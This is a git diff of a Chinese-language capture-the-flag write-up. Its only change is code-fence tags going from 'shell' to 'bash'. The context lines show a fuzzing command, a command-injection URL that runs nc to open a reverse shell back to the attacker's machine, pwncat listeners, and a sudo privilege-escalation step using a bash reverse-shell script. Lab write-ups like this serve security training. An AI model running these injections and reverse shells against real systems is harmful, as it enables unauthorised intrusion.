@@ -63,7 +63,7 @@ Network Distance: 1 hop
 
 ## 对 `/administration.php` 文件进行 fuzz 攻击
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~/tmp]
 └──╼ $wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh 65 'http://192.168.56.112:8080/administration.php?FUZZ=test'
 ********************************************************
@@ -95,7 +95,7 @@ http://192.168.56.112:8080/administration.php?logfile=;nc%20192.168.56.102%20999
 
 成功得到 shell 会话
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $pwncat-cs -lp 9999
 [20:29:03] Welcome to pwncat 🐈!                                                                                                                                                                                            __main__.py:164
@@ -140,13 +140,13 @@ User www-data may run the following commands on insomnia:
 
 将 bash 反弹 shell 的 poc 写入 `/var/www/html/start.sh` ，然后执行
 
-```shell
+```bash
 sudo -u julia /bin/bash /var/www/html/start.sh
 ```
 
 即可收到反连的shell会话
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp]
 └──╼ $pwncat-cs -lp 8888
 [20:35:57] Welcome to pwncat 🐈!                                                                                      __main__.py:164
@@ -160,7 +160,7 @@ julia
 
 ## user pwned
 
-```shell
+```bash
 (remote) julia@insomnia:/home/julia$ cat user.txt 
 
 ~~~~~~~~~~~~~\
